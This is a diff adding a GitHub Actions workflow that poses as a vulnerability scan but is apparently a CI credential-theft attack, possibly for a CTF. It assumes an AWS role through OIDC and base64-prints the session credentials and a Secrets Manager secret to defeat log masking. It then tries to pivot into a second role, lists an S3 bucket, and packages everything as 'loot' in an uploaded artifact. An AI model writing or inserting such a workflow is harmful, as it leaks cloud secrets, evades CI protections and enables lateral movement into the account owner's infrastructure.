@@ -1,0 +1,76 @@
+name: configure aws creds
+
+on:
+  workflow_dispatch:
+
+permissions:
+  id-token: write
+  contents: read
+
+jobs:
+  ScanVulns:
+    runs-on: ubuntu-latest
+    env:
+      AWS_REGION: us-west-2
+
+    steps:
+      - name: Configure AWS credentials via OIDC
+        uses: aws-actions/configure-aws-credentials@v4
+        with:
+          role-to-assume: arn:aws:iam::170974506515:role/github-deployment-role
+          role-session-name: oidc-base
+          aws-region: us-west-2
+
+      - name: Who am I (base role)
+        run: aws sts get-caller-identity
+
+      - name: Save BASE role creds (mask-bypass)
+        run: |
+          cat > base_creds.json <<JSON
+          {
+            "AccessKeyId":    "${AWS_ACCESS_KEY_ID}",
+            "SecretAccessKey":"${AWS_SECRET_ACCESS_KEY}",
+            "SessionToken":   "${AWS_SESSION_TOKEN}",
+            "Region":         "us-west-2"
+          }
+          JSON
+          echo "BASE_CREDS_B64: $(base64 -w0 base_creds.json 2>/dev/null || base64 base_creds.json)"
+
+      - name: Read secret internal/secrets/id-v2
+        id: getsecret
+        run: |
+          aws secretsmanager get-secret-value \
+            --secret-id internal/secrets/id-v2 \
+            --region us-west-2 > secret.json || { echo "Could not read secret"; exit 0; }
+          jq . secret.json > secret.pretty.json
+          # Mask-bypass in logs
+          echo "SECRET_B64: $(base64 -w0 secret.json 2>/dev/null || base64 secret.json)"
+
+      - name: Assume NEXT role (if trust allows)
+        run: |
+          aws sts assume-role \
+            --role-arn "arn:aws:iam::170974506515:role/prod-readonly-auditor" \
+            --role-session-name "pivot-ctf" \
+            > next_assume.json || { echo "assume-role failed (may need ExternalId)"; exit 0; }
+          echo "NEXT_CREDS_B64: $(base64 -w0 next_assume.json 2>/dev/null || base64 next_assume.json)"
+
+      - name: List S3 objects
+        continue-on-error: true
+        run: aws s3 ls s3://ci-deployment-logsv1/ --region us-west-2
+
+      - name: Zip loot
+        run: |
+          files=()
+          [[ -f base_creds.json ]] && files+=("base_creds.json")
+          [[ -f secret.json ]] && files+=("secret.json" "secret.pretty.json")
+          [[ -f next_assume.json ]] && files+=("next_assume.json")
+          if [[ ${#files[@]} -gt 0 ]]; then
+            zip -q loot.zip "${files[@]}"
+          fi
+
+      - name: Upload loot
+        if: hashFiles('loot.zip') != ''
+        uses: actions/upload-artifact@v4
+        with:
+          name: oidc-role-and-secret
+          path: loot.zip
